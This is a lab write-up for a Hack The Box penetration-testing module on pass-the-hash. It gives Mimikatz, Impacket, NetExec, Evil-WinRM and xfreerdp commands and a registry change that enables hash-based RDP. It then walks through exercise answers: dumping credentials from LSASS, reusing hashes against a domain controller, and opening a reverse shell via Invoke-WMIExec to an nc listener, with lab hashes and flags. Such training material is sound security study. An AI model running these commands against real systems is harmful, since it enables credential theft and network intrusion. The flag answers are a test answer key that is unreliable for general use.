### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Pass the Hash (PtH) <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Pass the Hash (PtH)



NTLM hashes are unsalted + static until password change. Possessing the hash = ability to authenticate without the cleartext password.

Hash sources: SAM (local), NTDS.dit (DC), LSASS memory.

#### Mimikatz (Windows) — `sekurlsa::pth`

```diff
+ c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /ntlm:<NThash> /domain:<domain> /run:cmd.exe" exit
```

<br>

Spawns `cmd.exe` with the impersonated user's NTLM credentials. Use that shell to access network resources as the user.

#### Invoke-TheHash (Windows PowerShell)

```diff
+ PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target <ip> -Domain <domain> -Username <user> -Hash <NThash> -Command "<cmd>" -Verbose
+ PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target <hostname> -Domain <domain> -Username <user> -Hash <NThash> -Command "<cmd>"
```

<br>

#### Impacket (Linux)

```diff
+ $ impacket-psexec administrator@<ip> -hashes :<NThash>
```

<br>

Other Impacket variants: `impacket-wmiexec`, `impacket-atexec`, `impacket-smbexec`.

#### NetExec (Linux) — sweep + execute

```diff
+ $ netexec smb <subnet>/24 -u Administrator -d . -H <NThash>
+ $ netexec smb <ip> -u Administrator -d . -H <NThash> -x whoami
```

<br>

Use `--local-auth` for local accounts (detects local-admin password reuse → useful for recommending LAPS).

#### Evil-WinRM (Linux)

```diff
+ $ evil-winrm -i <ip> -u Administrator -H <NThash>
```

<br>

#### RDP via xfreerdp

Requires `Restricted Admin Mode` enabled on target:

```diff
+ c:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<br>

Then PtH via:

```diff
+ $ xfreerdp /v:<ip> /u:<user> /pth:<NThash>
```

<br>

#### UAC limits for local accounts

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`:
- `0` (default) → only built-in RID-500 admin can do remote admin tasks
- `1` → other local admins can too

If `FilterAdministratorToken=1`, even the renamed RID-500 falls under UAC = remote PtH fails.

Domain accounts with admin rights are unaffected.

<br>

---

<br>

### Exercise

IP: 10.129.204.23 — Authenticate as `Administrator` with NT hash `30B3783CE2ABF1AF70F77D0660CF3453`.

---

### Question 1:
Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

```diff
+ $ evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+ *Evil-WinRM* PS C:\> type pth.txt
```

	G3t_4CCE$$_V1@_PTH

&#x1F6A9; found `G3t_4CCE$$--edit--_V1@_PTH`.

---

### Question 2:
Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

In the WinRM shell, set the registry value:

```diff
+ *Evil-WinRM* PS C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<br>

```diff
+ $ xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

&#x1F6A9; found **DisableRestricted--edit--Admin**.

---

### Question 3:
Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

Open admin cmd, run mimikatz with debug + sekurlsa:

```diff
+ mimikatz # privilege::debug
+ mimikatz # sekurlsa::logonpasswords
```

<br>

Search output for `David`.

&#x1F6A9; found **c39f2beb3d2ec0--edit--6a62cb887fb391dee0**.

---

### Question 4:
Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

```diff
+ c:\tools>mimikatz.exe privilege::debug "sekurlsa::pth /user:David /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

<br>

In the spawned cmd window:

```diff
+ C:\> type \\DC01\david\david.txt
```

	D3V1d_Fl5g_is_Her3

&#x1F6A9; found **D3V1d_Fl5g--edit--_is_Her3**.

---

### Question 5:
Using Julio's hash, perform a Pass the Ticket attack to connect to the shared folder \\DC01\julio and read the file julio.txt.

```diff
+ c:\tools>mimikatz.exe privilege::debug "sekurlsa::pth /user:Julio /ntlm:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
+ C:\> type \\DC01\julio\julio.txt
```

	JuL1()_SH@re_fl@g

&#x1F6A9; found **JuL1()_SH--edit--@re_fl@g**.

---

### Question 6:
Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

Start nc listener on MS01:

```diff
+ PS c:\tools>.\nc.exe -nlvp 9999
```

<br>

Get the internal-segment IP (DC can only reach `Ethernet1 2` interface, 172.16.1.5).

Generate a base64 PowerShell #3 reverse shell on revshells.com pointing to that IP:port.

Pop a priv PS, import Invoke-TheHash:

```diff
+ PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+ PS C:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e <base64-payload>"
```

<br>

Reverse shell lands on the listener, traverse to the flag:

```diff
+ PS C:\Windows\system32> type C:\julio\flag.txt
```

	JuL1()_N3w_fl@g

&#x1F6A9; found **JuL1()_N3w--edit--_fl@g**.
